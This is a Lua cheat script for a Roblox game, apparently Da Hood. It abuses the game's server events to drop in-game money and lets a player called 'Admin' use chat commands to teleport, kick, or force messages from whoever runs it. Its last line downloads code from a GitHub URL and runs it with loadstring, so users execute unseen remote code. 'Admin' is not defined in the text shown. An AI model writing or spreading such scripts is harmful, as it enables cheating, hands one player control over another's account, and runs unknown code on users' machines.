function drop()
local args = {
    [1] = "DropMoney",
    [2] = "10000"
}

game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
end

function message(message)
local args = {
    [1] = message,
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end



Admin.Chatted:connect(function(msg) 
          msg = string.lower(msg)
          msg = string.gsub(msg, " ", "")
          if string.sub(msg,1,1) == "*" then
              if string.sub(msg,2,6) == "bring" or string.sub(msg,2,6) == "Bring" then
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Admin.Character.HumanoidRootPart.CFrame
                elseif
                string.sub(msg,2,10) == "apologize" or string.sub(msg,2,10) == "Apologize" then
                  message("I "..game.Players.LocalPlayer.Name..", would like to apologize for any inconvenience's I may have Caused.")
                elseif
                string.sub(msg,2,5) == "Kick" or string.sub(msg,2,5) == "kick" then
                    game.Players.LocalPlayer:Kick("script owner kicked you")
                elseif
                string.sub(msg,2,5) == "drop" or string.sub(msg,2,5) == "drop" then
                    drop()
	        end
	      end   
     end)


loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
